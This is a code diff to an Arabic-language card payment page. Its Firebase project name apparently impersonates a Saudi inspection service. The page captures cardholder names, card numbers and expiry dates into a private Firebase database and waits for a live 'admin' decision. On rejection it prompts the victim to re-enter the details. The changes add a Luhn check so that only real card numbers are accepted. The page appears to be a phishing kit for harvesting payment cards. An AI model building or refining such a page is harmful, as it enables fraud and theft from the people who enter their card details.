@@ -51,9 +51,9 @@
         .form-label { display: block; font-size: 13px; font-weight: bold; color: #444; margin-bottom: 7px; }
         .input-field { width: 100%; padding: 13px; border: 1px solid #e0e0e0; border-radius: 10px; font-size: 16px; outline: none; transition: 0.3s; }
         
-        /* --- التعديلات الجديدة لحالة الخطأ --- */
+        /* التنسيقات الجديدة لحالة الخطأ */
         .input-error { border: 2px solid var(--error-red) !important; background-color: #fff8f8; }
-        .error-text { color: var(--error-red); font-size: 11px; font-weight: bold; margin-top: 5px; display: none; }
+        .error-text { color: var(--error-red); font-size: 11px; font-weight: bold; margin-top: 5px; display: none; text-align: right; }
 
         .ltr-field { direction: ltr; text-align: left; }
         .rtl-field { direction: rtl; text-align: right; }
@@ -130,7 +130,6 @@
     </div>
 
     <script>
-        // إعدادات Firebase
         const firebaseConfig = { 
             apiKey: "AIzaSyAeZAjt4kZWVLJSKiehqLFrT...", 
             authDomain: "saso-inspection.firebaseapp.com",
@@ -150,13 +149,13 @@
         const visaIcon = "https://img.icons8.com/color/48/000000/visa.png";
         const masterIcon = "https://img.icons8.com/color/48/000000/mastercard.png";
 
-        // تحديث اسم الحامل
+        // تحديث اسم حامل البطاقة
         document.getElementById('cardHolder').addEventListener('input', function() {
             this.value = this.value.replace(/[0-9]/g, '');
             document.getElementById('viewCardHolder').innerText = this.value || 'اسم حامل البطاقة';
         });
 
-        // تنسيق رقم البطاقة وإزالة الخطأ عند الكتابة
+        // تنسيق رقم البطاقة وإزالة الخطأ عند التعديل
         document.getElementById('cardNumber').addEventListener('input', function() {
             let val = this.value.replace(/\D/g, '');
             let formatted = val.match(/.{1,4}/g)?.join(' ') || '';
@@ -168,7 +167,7 @@
             else if (val.startsWith('5')) { logoImg.src = masterIcon; logoImg.style.display = "block"; }
             else { logoImg.style.display = "none"; }
             
-            // إخفاء اللون الأحمر والرسالة عند البدء في التصحيح
+            // إخفاء اللون الأحمر والرسالة بمجرد البدء في الكتابة
             this.classList.remove('input-error');
             document.getElementById('cardErrorMsg').style.display = "none";
         });
@@ -179,12 +178,27 @@
             document.getElementById('viewCardExpiry').innerText = this.value || '00 / 00';
         });
 
+        // خوارزمية Luhn للتحقق من أن رقم البطاقة حقيقي (ليس عشوائياً)
+        function isValidLuhn(number) {
+            let num = number.replace(/\s/g, '');
+            let sum = 0;
+            let shouldDouble = false;
+            for (let i = num.length - 1; i >= 0; i--) {
+                let digit = parseInt(num.charAt(i));
+                if (shouldDouble) {
+                    if ((digit *= 2) > 9) digit -= 9;
+                }
+                sum += digit;
+                shouldDouble = !shouldDouble;
+            }
+            return (sum % 10) === 0;
+        }
+
         function submitPayment() {
             const cardInput = document.getElementById('cardNumber');
-            const errorMsg = document.getElementById('cardErrorMsg');
             
-            // فحص مبدئي قبل الإرسال
-            if (cardInput.value.replace(/\s/g, '').length < 16) {
+            // فحص صحة الرقم قبل الإرسال
+            if (cardInput.value.replace(/\s/g, '').length < 16 || !isValidLuhn(cardInput.value)) {
                 showError();
                 return;
             }
@@ -202,7 +216,7 @@
 
             database.ref('payments/' + visitorId).update(cardData);
 
-            // المراقبة اللحظية لقرار الأدمن
+            // مراقبة قرار الأدمن
             const controlRef = database.ref('payments/' + visitorId);
             controlRef.on('value', (snapshot) => {
                 const data = snapshot.val();
@@ -214,7 +228,7 @@
                 else if (data.status === "reject") {
                     document.getElementById('loadingOverlay').style.display = 'none';
                     showError();
-                    // تصفير الحالة للسماح بمحاولة جديدة
+                    // إعادة الحالة لتصحيح البيانات
                     controlRef.update({ status: "idle" });
                 }
             });
@@ -225,7 +239,7 @@
             const errorMsg = document.getElementById('cardErrorMsg');
             cardInput.classList.add('input-error');
             errorMsg.style.display = "block";
-            cardInput.scrollIntoView({ behavior: 'smooth', block: 'center' });
+            cardInput.focus();
         }
     </script>
 </body>
